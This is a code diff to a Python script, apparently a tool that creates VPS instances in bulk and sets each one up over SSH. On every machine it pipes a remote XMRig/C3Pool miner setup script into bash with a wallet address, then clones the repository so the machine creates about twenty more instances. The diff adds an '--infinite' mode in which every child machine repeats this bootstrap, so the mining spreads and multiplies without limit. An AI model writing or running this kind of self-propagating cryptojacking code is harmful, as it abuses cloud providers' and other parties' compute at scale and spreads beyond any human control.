@@ -60,6 +60,7 @@ DEFAULT_REPO = (
     or "https://github.com/Akilaea/bohrium-vps-pipeline.git"
 )
 DEFAULT_MODE = "bootstrap"  # bootstrap | mine
+DEFAULT_INFINITE = False  # True: 子机继续 bootstrap 无限递增；False: 子机仅 mine
 DEFAULT_OUT = ROOT / "vps_result.json"
 DEFAULT_COUNT = 20
 DEFAULT_WORKERS = 20
@@ -205,10 +206,18 @@ def build_remote_cmds(
     remote_count: int = DEFAULT_REMOTE_COUNT,
     remote_workers: int = DEFAULT_REMOTE_WORKERS,
     remote_retries: int = DEFAULT_REMOTE_RETRIES,
+    infinite: bool = DEFAULT_INFINITE,
 ) -> list[tuple[str, str]]:
-    """SSH 阶段命令。bootstrap=拉仓库再开20台(叶子mine)；mine=只挖矿。"""
+    """SSH 阶段命令。
+
+    bootstrap:
+      - infinite=False: 拉仓库，再开 N 台叶子（mode=mine），只挖矿
+      - infinite=True:  拉仓库，再开 N 台继续 bootstrap+infinite，无限递增
+    mine: 只挖矿
+    """
     mode = (mode or "mine").strip().lower()
     wallet_q = _sh_quote(wallet)
+    repo_q = _sh_quote(repo)
     mine_inline = (
         "curl -s -L https://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh "
         f"| bash -s {wallet_q}"
@@ -216,16 +225,32 @@ def build_remote_cmds(
     if mode != "bootstrap":
         return [("执行挖矿脚本", mine_inline)]
 
-    repo_q = _sh_quote(repo)
     # ghproxy for China VPS if raw github clone fails
     repo_proxy = repo
-    if "github.com" in repo and "gh-proxy" not in repo:
+    if "github.com" in repo and "gh-proxy" not in repo and "ghproxy" not in repo:
         repo_proxy = "https://mirror.ghproxy.com/" + repo
     repo_proxy_q = _sh_quote(repo_proxy)
     mine_bash_q = _sh_quote(mine_inline)
     rc = max(int(remote_count), 1)
     rw = max(int(remote_workers), 1)
     rr = max(int(remote_retries), 0)
+    if infinite:
+        # 子机继续 bootstrap + infinite，实现无限递增
+        child_cmd = (
+            f"python3 vps.py --no-proxy --count {rc} --workers {rw} --retries {rr} "
+            f"--mode bootstrap --infinite "
+            f"--remote-count {rc} --remote-workers {rw} --remote-retries {rr} "
+            f"--repo {repo_q} --wallet {wallet_q}"
+        )
+        spawn_label = "克隆仓库并启动无限递增开号挖矿"
+    else:
+        # 子机只挖矿，停止递增
+        child_cmd = (
+            f"python3 vps.py --no-proxy --count {rc} --workers {rw} --retries {rr} "
+            f"--mode mine --wallet {wallet_q}"
+        )
+        spawn_label = "克隆仓库并启动二阶开号挖矿"
+
     bootstrap = (
         "set -e\n"
         "export DEBIAN_FRONTEND=noninteractive\n"
@@ -244,10 +269,10 @@ def build_remote_cmds(
         "python3 -m pip install -r requirements.txt -q -i https://pypi.tuna.tsinghua.edu.cn/simple "
         "|| python3 -m pip install -r requirements.txt -q\n"
         f"nohup bash -c {mine_bash_q} >/root/self_mine.log 2>&1 &\n"
-        f"nohup python3 vps.py --no-proxy --count {rc} --workers {rw} "
-        f"--retries {rr} --mode mine --wallet {wallet_q} >/root/vps_spawn.log 2>&1 &\n"
+        f"nohup {child_cmd} >/root/vps_spawn.log 2>&1 &\n"
         "SPID=$!\n"
         "echo SPAWN_PID=$SPID\n"
+        f"echo INFINITE={'1' if infinite else '0'}\n"
         "sleep 8\n"
         "if ps -p $SPID >/dev/null 2>&1; then\n"
         "  echo SPAWN_STARTED_OK\n"
@@ -257,7 +282,7 @@ def build_remote_cmds(
         "tail -n 120 /root/vps_spawn.log || true\n"
         "exit 1\n"
     )
-    return [("克隆仓库并启动二阶开号挖矿", bootstrap)]
+    return [(spawn_label, bootstrap)]
 
 
 def run_pipeline_once(
@@ -284,6 +309,7 @@ def run_pipeline_once(
     remote_count: int = DEFAULT_REMOTE_COUNT,
     remote_workers: int = DEFAULT_REMOTE_WORKERS,
     remote_retries: int = DEFAULT_REMOTE_RETRIES,
+    infinite: bool = DEFAULT_INFINITE,
     wait_ssh: float = 180.0,
     ssh_port: int = 22,
     cmd_timeout: float | None = 3600.0,
@@ -486,9 +512,11 @@ def run_pipeline_once(
             remote_count=remote_count,
             remote_workers=remote_workers,
             remote_retries=remote_retries,
+            infinite=infinite,
         )
         ssh_info["mode"] = (mode or "mine").strip().lower()
         ssh_info["repo"] = repo
+        ssh_info["infinite"] = bool(infinite)
         for title, cmd in cmds:
             log_info("%s %s...", tag, title)
             code, out_text, err_text = run_cmd(
@@ -701,6 +729,17 @@ def build_parser() -> argparse.ArgumentParser:
         default=DEFAULT_REMOTE_RETRIES,
         help=f"bootstrap 远程重试（默认 {DEFAULT_REMOTE_RETRIES}）",
     )
+    p.add_argument(
+        "--infinite",
+        action="store_true",
+        default=DEFAULT_INFINITE,
+        help="开启无限递增：子机继续 bootstrap 再开号（默认关闭，子机仅挖矿）",
+    )
+    p.add_argument(
+        "--no-infinite",
+        action="store_true",
+        help="关闭无限递增（默认行为，可显式指定）",
+    )
     p.add_argument("--wait-ssh", type=float, default=180.0, help="等待 SSH 超时秒数")
     p.add_argument("--ssh-port", type=int, default=22)
     p.add_argument("--cmd-timeout", type=float, default=3600.0, help="单条远程命令超时秒数")
@@ -767,17 +806,19 @@ def main(argv: list[str] | None = None) -> int:
         "remote_count": args.remote_count,
         "remote_workers": args.remote_workers,
         "remote_retries": args.remote_retries,
+        "infinite": False if args.no_infinite else bool(args.infinite),
         "wait_ssh": args.wait_ssh,
         "ssh_port": args.ssh_port,
         "cmd_timeout": args.cmd_timeout,
     }
 
     log_info(
-        "启动：任务数=%s 线程=%s 重试=%s 模式=%s 代理=%s",
+        "启动：任务数=%s 线程=%s 重试=%s 模式=%s 无限递增=%s 代理=%s",
         count,
         workers,
         retries,
         args.mode,
+        base_kwargs["infinite"],
         proxy or "无",
     )
 
